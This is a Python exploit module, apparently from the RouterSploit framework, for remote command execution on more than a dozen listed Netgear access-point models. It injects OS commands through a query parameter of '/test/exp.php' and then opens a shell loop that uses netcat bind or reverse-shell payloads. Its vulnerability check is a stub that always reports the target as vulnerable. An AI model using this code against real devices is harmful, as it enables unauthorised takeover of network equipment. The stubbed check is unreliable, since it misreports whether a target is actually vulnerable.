from urllib import quote

from routersploit import (
    exploits,
    print_status,
    print_success,
    print_error,
    random_text,
    http_request,
    mute,
    validators,
    shell,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for multiple Netgear's Remote Code Execution vulnerability.
    If the target is vulnerable, command loop is invoked that allows executing commands on operating system level.
    """
    __info__ = {
        'name': 'Netcat Multi RCE',
        'description': 'Module exploits remote command execution in multiple Netgear devices. If the target is '
                       'vulnerable, command loop is invoked that allows executing commands on operating system level.',
        'authors': [
            'Andrei Costin <andrei[at]firmware.re>',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'http://firmware.re/vulns/acsa-2015-001.php',
            'https://www.blackhat.com/docs/asia-16/materials/asia-16-Costin-Automated-Dynamic-Firmware-Analysis-At-Scale-A-Case-Study-On-Embedded-Web-Interfaces.pdf',
        ],
        'devices': [
            'Netgear WG102',
            'Netgear WG103',
            'Netgear WN604',
            'Netgear WNDAP350',
            'Netgear WNDAP360',
            'Netgear WNAP320',
            'Netgear WNAP210',
            'Netgear WNDAP660',
            'Netgear WNDAP620',
            'Netgear WNDAP380R',
            'Netgear WNDAP380R(v2)',
            'Netgear WN370',
            'Netgear WND930',
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port')

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")

            shell(self, architecture="generic", method="generic", location="/tmp", payloads=["netcat_bind_tcp", "netcat_reverse_tcp"])

    def execute(self, cmd):
        url = ("{}:{}/test/exp.php?lolas={}".format(self.target, self.port, quote(cmd)))

        # blind command injection
        response = http_request(method="GET", url=url)
        if response:
            return response.text

        return ""

    @mute
    def check(self):
        return True
